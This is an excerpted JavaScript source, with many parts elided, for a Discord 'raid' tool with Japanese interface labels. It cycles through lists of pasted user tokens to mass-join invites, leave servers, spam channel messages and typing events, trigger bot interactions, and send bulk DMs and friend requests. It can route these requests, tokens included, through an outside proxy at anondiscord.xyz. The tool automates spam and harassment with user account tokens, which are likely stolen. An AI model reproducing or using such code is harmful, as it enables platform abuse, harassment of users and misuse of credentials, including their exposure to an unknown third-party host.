(function() {
    ...
    function initInterval(num) { // リクエスト送信間隔を初期化する
        return (!isFinite(num) || isNaN(num) || num < 0.00000000000000000000000000000000001) ? 0.1 : num;
    };
        ...
        aliveCheckBtn = addBtn(area["生存確認"], "判定").remove().insertAfter(aliveCheckDesc).before("<br><br>").after("<br>").on("click", function() {
            ...
            splitLine(inputToken.val()).forEach(function(v, i) {
                g_ajaxTimeoutIds.push(setTimeout(function() {
                    ...
                    $.ajax({
                        type: "PATCH",
                        url: (proxyrequest.find("input[type='checkbox']").prop("checked") ? "https://anondiscord.xyz/tokenstool/proxy.php?"+Date.now().toString()+"&url=" : "") + "https://discord.com/api/v8/users/@me/settings",
                        headers: {
                            authorization: v,
    ...
    addBtn(area["レイド"], "招待を受ける", function() {
        ...
        splitLine(inputToken.val()).forEach(function(v, i) {
            g_ajaxTimeoutIds.push(setTimeout(function() {
                ...
                $.ajax({
                    type: "POST",
                    url: (proxyrequest.find("input[type='checkbox']").prop("checked") ? "https://anondiscord.xyz/tokenstool/proxy.php?"+Date.now().toString()+"&url=" : "") + "https://discord.com/api/v8/invites/" + inputInvite.val(),
                    headers: {
                        authorization: v
                    }
                }).always(function(body, statusText, data) {
    ...
    addBtn(area["レイド"], "サーバーから脱退", function() {
        ...
        splitLine(inputToken.val()).forEach(function(v, i) {
            g_ajaxTimeoutIds.push(setTimeout(function() {
                ...
                $.ajax({
                    type: "DELETE",
                    url: (proxyrequest.find("input[type='checkbox']").prop("checked") ? "https://anondiscord.xyz/tokenstool/proxy.php?"+Date.now().toString()+"&url=" : "") + "https://discord.com/api/v8/users/@me/guilds/" + inputGuildId.val(),
                    headers: {
                        authorization: v
                    }
                }).always(function(body, statusText, data) {
            ...
            splitLine(inputChannelId.val()).forEach(function(a, i, arr) {
                splitLine(inputToken.val()).forEach(function(b, o) {
                    g_ajaxTimeoutIds.push(setTimeout(function() {
                        ...
                        $.ajax({
                            type: "POST",
                            url: (proxyrequest.find("input[type='checkbox']").prop("checked") ? "https://anondiscord.xyz/tokenstool/proxy.php?"+Date.now().toString()+"&url=" : "") + "https://discord.com/api/v8/channels/" + a + "/messages",
                            headers: {
                                authorization: b,
                                "content-type": "application/json"
                            },
        ...
        splitLine(inputChannelId.val()).forEach(function(a, i, arr) {
            splitLine(inputToken.val()).forEach(function(b, o) {
                g_ajaxTimeoutIds.push(setTimeout(function() {
                    ...
                    $.ajax({
                        type: "POST",
                        url: (proxyrequest.find("input[type='checkbox']").prop("checked") ? "https://anondiscord.xyz/tokenstool/proxy.php?"+Date.now().toString()+"&url=" : "") + "https://discord.com/api/v8/channels/" + a + "/typing",
                        headers: {
                            authorization: b
                        }
                    }).always(function(body, statusText, data) {
            ...
            splitLine(slinputBotid.val()).forEach(function(a2, i2, arr2) {
                splitLine(inputToken.val()).forEach(function(b, o) {
                    g_ajaxTimeoutIds.push(setTimeout(function() {
                        ...
                        $.ajax({
                            type: "POST",
                            url: (proxyrequest.find("input[type='checkbox']").prop("checked") ? "https://anondiscord.xyz/tokenstool/proxy.php?"+Date.now().toString()+"&url=" : "") + "https://discord.com/api/v8/interactions",
                            headers: {
                                authorization: b,
                                "content-type": "application/json"
                            },
    ...
    addBtn(area["ダイレクトメッセージ"], "送信", function() {
        ...
        splitLine(inputToken.val()).forEach(function(v, i) {
            g_ajaxTimeoutIds.push(setTimeout(function() {
                ...
                $.ajax({
                    type: "POST",
                    url: (proxyrequest.find("input[type='checkbox']").prop("checked") ? "https://anondiscord.xyz/tokenstool/proxy.php?"+Date.now().toString()+"&url=" : "") + "https://discord.com/api/v8/users/@me/channels",
                    headers: {
                        authorization: v,
                        "content-type": "application/json"
                    },
                    ...
                    $.ajax({
                        type: "POST",
                        url: (proxyrequest.find("input[type='checkbox']").prop("checked") ? "https://anondiscord.xyz/tokenstool/proxy.php?"+Date.now().toString()+"&url=" : "") + "https://discord.com/api/v8/channels/" + data.id + "/messages",
                        headers: {
                            authorization: v,
                            "content-type": "application/json"
                        },
    ...
    addBtn(area["フレンドリクエスト"], "送信", function() {
        ...
        splitLine(inputToken.val()).forEach(function(v, i) {
            ...
            g_ajaxTimeoutIds.push(setTimeout(function() {
                ...
                $.ajax({
                    type: "POST",
                    url: (proxyrequest.find("input[type='checkbox']").prop("checked") ? "https://anondiscord.xyz/tokenstool/proxy.php?"+Date.now().toString()+"&url=" : "") + "https://discord.com/api/v8/users/@me/relationships",
                    headers: {
                        authorization: v,
                        "content-type": "application/json"
                    },
